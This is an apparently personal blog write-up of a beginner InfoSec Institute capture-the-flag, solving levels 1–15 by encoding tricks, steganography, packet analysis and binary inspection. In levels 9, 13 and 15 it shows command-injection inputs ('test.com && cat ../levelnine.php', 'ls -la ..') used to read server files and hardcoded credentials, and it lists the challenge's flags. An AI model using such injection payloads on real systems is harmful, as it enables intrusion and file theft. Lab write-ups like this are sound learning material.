I manage to solve some of the others.&lt;/p&gt;

&lt;h2 id=&#34;level-01:aad69195db02279e47989643f4843312&#34;&gt;Level 01&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelone.php&#34;&gt;http://ctf.infosecinstitute.com/levelone.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/ebnLRwp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;May the source be with you, eh? Sounds to me like someone wants us to look at the
page source. Right click, select &lt;code&gt;view page source&lt;/code&gt; and&amp;hellip;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- infosec_flagis_welcome --&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;html&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;lang=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And there it is, right at the top.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_welcome
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level-02:aad69195db02279e47989643f4843312&#34;&gt;Level 02&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveltwo.php&#34;&gt;http://ctf.infosecinstitute.com/leveltwo.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/TVGZFKU.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A broken image you say? Let&amp;rsquo;s download it and have a look. We notice it&amp;rsquo;s very small,
only 45 bytes. So let&amp;rsquo;s open it in a hex editor and examine its contents. I opened
it in vim (to use it as a hex editor enter &lt;code&gt;:!xxd&lt;/code&gt;),
and was instantly greeted with this string. Didn&amp;rsquo;t even have to convert it to hex.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Base64 encoded text. Let&amp;rsquo;s run it through a decoder and see what we get&amp;hellip;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_wearejuststarting
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Level02&amp;rsquo;s flag done.&lt;/p&gt;

&lt;h2 id=&#34;level-03:aad69195db02279e47989643f4843312&#34;&gt;Level 03&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelthree.php&#34;&gt;http://ctf.infosecinstitute.com/levelthree.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/lL8OkTO.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We are presented with a QR code. So I grabbed my phone, scanned it, and was presented
with a series of dots and dashes. Morse code no doubt. Being lazy I didn&amp;rsquo;t want to type
it into a decoder manually,
so I used &lt;a href=&#34;http://zxing.org/w/decode.jspx&#34;&gt;this tool&lt;/a&gt; to decode the QR code
and then copy/pasted the output into a &lt;a href=&#34;http://www.onlineconversion.com/morse_code.htm&#34;&gt;morse code translator&lt;/a&gt;
and ended up with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;INFOSECFLAGISMORSING
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level-04:aad69195db02279e47989643f4843312&#34;&gt;Level 04&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfour.php&#34;&gt;http://ctf.infosecinstitute.com/levelfour.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/yFiSrus.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A picture and a tidbit of information. Hrmm&amp;hellip; Ok, not much to go with here. Mousing
over the image pops up a dialog. Investigating that didn&amp;rsquo;t lead me anywhere. Time
to get the thinking hats on and think about what info we have here that might be
relevant. Because everything we need to solve this level is somewhere here.
Of course the biggest clue is the picture: Cookie Monster. Right, let&amp;rsquo;s check the cookie
cache. Only one cookie by infosecinstitute. It&amp;rsquo;s garbage! Or is it perhaps just a
caesar cipher? Each letter is shifted by a certain amount, and we need to figure out
that amount. Due to the number of characters and _ in the string, it looks like it.&lt;/p&gt;

&lt;p&gt;Knowing the format of previous flags we can figure out how much to shift by.&lt;/p&gt;

&lt;p&gt;So &lt;code&gt;vasbfrp_syntvf_jrybirpbbxvrf&lt;/code&gt; should be &lt;code&gt;infosec_flag_xxxxxxx&lt;/code&gt;. Knowing this
we can work out the shift. Simple write out the alphabet once and
then, write the letters we know below.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;abcdefghijklmnopqrstuvwxyz
n                 f   i
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s enough for us to fill in the rest of the alphabet.
Then transpose and solve the final part to get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flag_welovecookies
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flag has been nommed.&lt;/p&gt;

&lt;h2 id=&#34;level-05:aad69195db02279e47989643f4843312&#34;&gt;Level 05&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfive.php&#34;&gt;http://ctf.infosecinstitute.com/levelfive.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A pesky popup saying I&amp;rsquo;m a hacker? What an accusation. Well, let&amp;rsquo;s top it from
popping up and get ourselves a script blocker to see what else there might be.
Once done, we examine the source and see it&amp;rsquo;s loading an image too.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;img&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;src=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;img/aliens.jpg&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;



&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/JwFtmSw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Let&amp;rsquo;s load up that image, or even better, let&amp;rsquo;s just browse to &lt;code&gt;http://ctf.infosecinstitute.com/img/&lt;/code&gt;
(Since writing directory listing has been disabled for this path).
Nothing particularily odd about the image. Let&amp;rsquo;s try seeing if there&amp;rsquo;s anything hidden in
it by way of steganography. I loaded up the image into &lt;a href=&#34;http://www.futureboy.us/stegano/decinput.html&#34;&gt;this site&lt;/a&gt;
and sure enough, selecting a type of &lt;code&gt;text/plain&lt;/code&gt; we get a stream of 1s and 0s. Binary data.
Let&amp;rsquo;s try to convert that to a string and see what, if anything, it says. Using any
binary to text decoder on the internet, we are given the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_stegaliens
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Gotcha&lt;/p&gt;

&lt;h2 id=&#34;level-06:aad69195db02279e47989643f4843312&#34;&gt;Level 06&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelsix.php&#34;&gt;http://ctf.infosecinstitute.com/levelsix.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/w81ZV0N.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;At first I was a bit lost, but when you stare at a lot of data, it&amp;rsquo;s easy to be overwhelmed.
Especially when you don&amp;rsquo;t know really what you are looking for. I decided to give it another go
and have located the flag. It&amp;rsquo;s actually in the very first packet. The hex string for &lt;em&gt;infosec_flag&lt;/em&gt;
is starting to look very familiar now. It appears as the data of the first packet:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/aO8ojXG.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Enter the string with &lt;code&gt;696e66...&lt;/code&gt; into a hex to string converter and you get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_sniffed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sniffed right out.&lt;/p&gt;

&lt;h2 id=&#34;level-07:aad69195db02279e47989643f4843312&#34;&gt;Level 07&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/404.php&#34;&gt;http://ctf.infosecinstitute.com/404.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/PZu5CIK.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We get an error saying &lt;em&gt;f00 not found&lt;/em&gt; and the URL reads 404.php. Going by the other URLs
I would assume we actually need &lt;code&gt;levelseven.php&lt;/code&gt;, so let&amp;rsquo;s enter that and see what we get.
It seems to return an empty page. That&amp;rsquo;s not much use, but it&amp;rsquo;s better than a real
404. Because there&amp;rsquo;s no error and no content, we must be getting back a 200 status (all OK).
Perhaps there&amp;rsquo;s something else to look at too?&lt;/p&gt;

&lt;p&gt;In this case let&amp;rsquo;s examine what&amp;rsquo;s going back and forth between us and the server.
You can either fire up a proxy like &lt;a href=&#34;https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project&#34;&gt;ZAP&lt;/a&gt;
or use a request inspection plugin for Firefox like &lt;a href=&#34;https://addons.mozilla.org/en-US/firefox/addon/httprequester/&#34;&gt;httpRequester&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s send off a GET request for &lt;code&gt;levelseven.php&lt;/code&gt; and see what we get back.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==
Date: Thu, 12 Mar 2015 09:26:48 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.6
Content-Length: 0
Connection: close
Content-Type: text/html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Heh, very nice. We have a 200 response with, what is clearly a base64 encoded string.
Copypasta that into a decoder and let&amp;rsquo;s see what we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_youfoundit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yes, I did find it.&lt;/p&gt;

&lt;h2 id=&#34;level-08:aad69195db02279e47989643f4843312&#34;&gt;Level 08&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveleight.php&#34;&gt;http://ctf.infosecinstitute.com/leveleight.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/OSKPz0g.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok, let&amp;rsquo;s download &lt;code&gt;app.exe&lt;/code&gt; and give this a go. It&amp;rsquo;s a wrapper around &lt;code&gt;netstat&lt;/code&gt; that
just shows you what your current connections are. It takes no arguments, so there&amp;rsquo;s
not anyway to attack this thing with overflows. And this being a n00bs level CTF, it&amp;rsquo;s
unlikely we&amp;rsquo;ll be thrown this kind of exploit development.
So the other thing we can do is check its strings.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;strings app.exe
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sure enough, there&amp;rsquo;s &lt;code&gt;infosec_flagis_0x1a&lt;/code&gt;. At first I was reluctant to go with this, as
it&amp;rsquo;s a bit too simple, so I looked a bit further. I dumped the source with &lt;code&gt;objdump&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;objdump -s app.exe | less
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And I found &lt;code&gt;infosec_flagis_0x1a&lt;/code&gt; in it. It sits at &lt;code&gt;0x403000&lt;/code&gt;, so let&amp;rsquo;s run this
through &lt;code&gt;gdb&lt;/code&gt; too.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; gdb app.exe
gdb$ disass main
Dump of assembler code for function main:
   0x00401290 &amp;lt;+0&amp;gt;:	push   %ebp
   0x00401291 &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
   0x00401293 &amp;lt;+3&amp;gt;:	sub    $0x18,%esp
   0x00401296 &amp;lt;+6&amp;gt;:	and    $0xfffffff0,%esp
   0x00401299 &amp;lt;+9&amp;gt;:	mov    $0x0,%eax
   0x0040129e &amp;lt;+14&amp;gt;:	add    $0xf,%eax
   0x004012a1 &amp;lt;+17&amp;gt;:	add    $0xf,%eax
   0x004012a4 &amp;lt;+20&amp;gt;:	shr    $0x4,%eax
   0x004012a7 &amp;lt;+23&amp;gt;:	shl    $0x4,%eax
   0x004012aa &amp;lt;+26&amp;gt;:	mov    %eax,-0x8(%ebp)
   0x004012ad &amp;lt;+29&amp;gt;:	mov    -0x8(%ebp),%eax
   0x004012b0 &amp;lt;+32&amp;gt;:	call   0x401740 &amp;lt;_alloca&amp;gt;
   0x004012b5 &amp;lt;+37&amp;gt;:	call   0x4013e0 &amp;lt;__main&amp;gt;
   0x004012ba &amp;lt;+42&amp;gt;:	mov    $0x403000,%eax       &amp;lt;------ aha oho
   0x004012bf &amp;lt;+47&amp;gt;:	mov    %al,-0x1(%ebp)
   0x004012c2 &amp;lt;+50&amp;gt;:	movl   $0x403014,(%esp)
   0x004012c9 &amp;lt;+57&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012ce &amp;lt;+62&amp;gt;:	movl   $0x403044,(%esp)
   0x004012d5 &amp;lt;+69&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012da &amp;lt;+74&amp;gt;:	movl   $0x403014,(%esp)
   0x004012e1 &amp;lt;+81&amp;gt;:	call   0x401850 &amp;lt;printf&amp;gt;
   0x004012e6 &amp;lt;+86&amp;gt;:	movl   $0x403072,(%esp)
   0x004012ed &amp;lt;+93&amp;gt;:	call   0x401840 &amp;lt;system&amp;gt;
   0x004012f2 &amp;lt;+98&amp;gt;:	call   0x4017c0 &amp;lt;getch&amp;gt;
   0x004012f7 &amp;lt;+103&amp;gt;:	mov    $0x0,%eax
   0x004012fc &amp;lt;+108&amp;gt;:	leave  
   0x004012fd &amp;lt;+109&amp;gt;:	ret
   0x004012fe &amp;lt;+110&amp;gt;:	nop
   0x004012ff &amp;lt;+111&amp;gt;:	nop
End of assembler dump
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There we see a fimilar address. Checking its contents&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;gdb$ x/s 0x403000
0x403000:	 &amp;quot;infosec_flagis_0x1a&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s nothing that would indicate that this string changes, so for now, I&amp;rsquo;m
going to say the flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_0x1a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leave a comment below to correct me if I am wrong though, I&amp;rsquo;d really appreciate that.&lt;/p&gt;

&lt;h2 id=&#34;level-09:aad69195db02279e47989643f4843312&#34;&gt;Level 09&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelnine.php&#34;&gt;http://ctf.infosecinstitute.com/levelnine.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/5XnlOL9.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Initially I struggled with this. I tried the usual default passwords without success.
Attacked it with SQL injections, nothing. Then I had a brainwave. Because I already had level15,
I could just look at the &lt;code&gt;levelnine.php&lt;/code&gt; file. So I did. Issue &lt;code&gt;test.com &amp;amp;&amp;amp; cat ../levelnine.php&lt;/code&gt;
and at the end we see what happens if we get the flag:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;alert&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;ssaptluafed_sigalf_cesofni&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #960050; background-color: #1e0010&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It&amp;rsquo;s the flag reversed, so let&amp;rsquo;s flip it to get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_defaultpass
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ti tog yllaniF&lt;/p&gt;

&lt;p&gt;PS: What&amp;rsquo;s even cuter is if you run &lt;code&gt;test.com &amp;amp;&amp;amp; tac ../levelnine.php&lt;/code&gt;. You actually
get the popup. &lt;code&gt;tac&lt;/code&gt; does the same as &lt;code&gt;cat&lt;/code&gt;, but reverses the lines in the output.
The reason this works is because it will encounter the javascript pop up code before
the conditional that checks the input.&lt;/p&gt;

&lt;p&gt;It also prints out the username and password for us:
&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;?&amp;gt; } echo &amp;quot;&amp;quot;; if ($username == &amp;#39;root&amp;#39; and $password == &amp;#39;attack&amp;#39;) { 
    $password = $_POST[&amp;#39;password&amp;#39;]; 
    $username = $_POST[&amp;#39;username&amp;#39;];
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Now you can go to the levelnine url and enter that to get the flag. Either way should
be valid, as the aim of the game is to get the flag. It shouldn&amp;rsquo;t matter how you get it :)&lt;/p&gt;

&lt;p&gt;Level15 has been a huge help in all of this!&lt;/p&gt;

&lt;h2 id=&#34;level-10:aad69195db02279e47989643f4843312&#34;&gt;Level 10&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelten.php&#34;&gt;http://ctf.infosecinstitute.com/levelten.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QENqipl.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Let&amp;rsquo;s listen to the sound. Hrmm Squeaky. Could be anything. Maybe some weirdly pitched morse.
But let&amp;rsquo;s download and open it in Audacity. My initial hunch is that it&amp;rsquo;s sped up, due
to the highpitched sound. So I started reducing the playback speed, and it turns out that
at around 0.15 times the original speed, we hear someone talking. He&amp;rsquo;s actually telling us
the name of the flag&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_sound
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks kind stranger&lt;/p&gt;

&lt;h2 id=&#34;level-11:aad69195db02279e47989643f4843312&#34;&gt;Level 11&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveleleven.php&#34;&gt;http://ctf.infosecinstitute.com/leveleleven.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/L2tFy5t.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Hrmm.. there&amp;rsquo;s no sound this time, instead we get the PHP logo. Well, it&amp;rsquo;s all
we have so let&amp;rsquo;s open it up. I loaded it into vim, changed to hex mode (:%!xxd)
and right at the top we have&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yeah, that won&amp;rsquo;t be it will it? We&amp;rsquo;re very familiar with base64 now aren&amp;rsquo;t we? Ok, decode&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Open it up and we get an image. Because the domain is outside of the control of
this CTF, we can assume that the image hasn&amp;rsquo;t been tampered with or anything
is embedded in it and that the actual flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_powerslide
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ll take it, thanks!&lt;/p&gt;

&lt;h2 id=&#34;level-12:aad69195db02279e47989643f4843312&#34;&gt;Level 12&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveltwelve.php&#34;&gt;http://ctf.infosecinstitute.com/leveltwelve.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WdLl96v.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok we recognise this image. We had it in level 1 and we had to look at the source.
Our clue is dig deeper and that could mean a number of things. Let&amp;rsquo;s try some directory
traversal by appending a slash and some random text at the end. Hrm, we just
get a list of the levels and no css. Ok, that&amp;rsquo;s not it. Let&amp;rsquo;s dig into the source again.
There&amp;rsquo;s nothing obvious, but I reckon it might be one of the files included in the source.
It would make sense given the clue we&amp;rsquo;ve been given.&lt;/p&gt;

&lt;p&gt;To cut a long story short, there&amp;rsquo;s a css file &lt;code&gt;design.css&lt;/code&gt; that&amp;rsquo;s not included
in the other pages. I know this because I&amp;rsquo;ve pretty much looked at the source for each
level. Force of habit. Anyway, let&amp;rsquo;s take a look at it:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;.thisloveis&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;color&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;#696e666&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;f7365635f666c616769735f686579696d6e6f7461636f6c6f72;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aha, that&amp;rsquo;s not a valid colour is it? It&amp;rsquo;s also not base64. Looks like hex values
to me. Run it through a hex to text converter and&amp;hellip;..&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_heyimnotacolor
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yeah, you weren&amp;rsquo;t a colour, that&amp;rsquo;s for sure.&lt;/p&gt;

&lt;h2 id=&#34;level-13:aad69195db02279e47989643f4843312&#34;&gt;Level 13&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelthirteen.php&#34;&gt;http://ctf.infosecinstitute.com/levelthirteen.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/JX3Je1g.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Ok, this was a bit of a cheat, because I skipped to level 15 and now I have a a few more
tools available. I ran &lt;code&gt;test.com &amp;amp;&amp;amp; ls -la ..&lt;/code&gt; and voila, there&amp;rsquo;s the backup file:
&lt;code&gt;levelthirteen.php.old&lt;/code&gt;. Much easier than guessing, right?
Looking at this file we see it will prompt us to download a file called &lt;code&gt;misc/imadecoy&lt;/code&gt;.
This seems to be a network capture involving a project called &lt;a href=&#34;https://github.com/shipcod3/honeypy&#34;&gt;HoneyPy&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I opened it up in wireshark and spent quite a bit of time on it. There&amp;rsquo;s really nothing
interesting in it for the most part. However near the end we get a PNG image called
&lt;code&gt;HoneyPY.PNG&lt;/code&gt;. For some reason this just stood out to me. I took a chance and exported it
by rightclicking the packet and selecting &lt;code&gt;Export Selected Packet Bytes&lt;/code&gt; as shown&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/jhH2v19.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Opening this image surprises us with a flag! W00t! That flag is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_morepackets
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A wireshark level I managed to do. Yay&lt;/p&gt;

&lt;h2 id=&#34;level-14:aad69195db02279e47989643f4843312&#34;&gt;Level 14&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfourteen.php&#34;&gt;http://ctf.infosecinstitute.com/levelfourteen.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/0akB0Ni.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;UPDATE: The &lt;code&gt;level14.db&lt;/code&gt; file has been removed and the &lt;code&gt;misc&lt;/code&gt; directory can
no longer be listed. Use the second method below to solve this level&lt;/p&gt;

&lt;p&gt;Once downloaded we get a database backup file. This one was quite interesting because
there are two places where the flag is. So first I looked at what else is in the
&lt;code&gt;misc&lt;/code&gt; directory where this file lives. There&amp;rsquo;s a &lt;code&gt;level14.db&lt;/code&gt; file. Let&amp;rsquo;s
take a look at that.&lt;/p&gt;

&lt;p&gt;It adds an entry to the flag db. It&amp;rsquo;s a hex string, so like above, simply decode it and
get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_whatsorceryisthis
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But, look at the &lt;code&gt;level14&lt;/code&gt; file again. Scroll through and notice that in the
&lt;code&gt;friends&lt;/code&gt; table there&amp;rsquo;s a fimilar entry. Decoding that will also give you the flag.&lt;/p&gt;

&lt;h2 id=&#34;level-15:aad69195db02279e47989643f4843312&#34;&gt;Level 15&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfifteen/index.php&#34;&gt;http://ctf.infosecinstitute.com/levelfifteen/index.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/EVJuDmC.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;So here we can lookup a dns entry by typing a domain in the text field. So let&amp;rsquo;s try
that and see what we get. I used &lt;code&gt;test.com&lt;/code&gt; and as a result I get the output
from the &lt;code&gt;dig&lt;/code&gt; command. Interesting. It could be that the php script is merely
calling &lt;code&gt;dig&lt;/code&gt; with the search term appended to it. This is a bad way to execute
a command, and we will see why. In Linux you can append a command to another using &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;.
So let&amp;rsquo;s try listing the directory with &lt;code&gt;test.com&amp;amp;&amp;amp;ls&lt;/code&gt; as our search query. Sure enough,
we see &lt;code&gt;index.php&lt;/code&gt; at the bottom of the output. Well, perhaps there&amp;rsquo;s some hidden files so
let&amp;rsquo;s run &lt;code&gt;test.com &amp;amp;&amp;amp; ls -la&lt;/code&gt;. Aha, there&amp;rsquo;s a file called &lt;code&gt;.hey&lt;/code&gt;, let&amp;rsquo;s cat that with
&lt;code&gt;test.com &amp;amp;&amp;amp; cat .hey&lt;/code&gt; and we get &lt;code&gt;Miux+mT6Kkcx+IhyMjTFnxT6KjAa+i6ZLibC&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Not sure however where to go from here. The ZlibC at the end of the string might
be a clue.&lt;/p&gt;

&lt;p&gt;Please leave any comments with ideas on this. I&amp;rsquo;m a bit stumped.&lt;/p&gt;

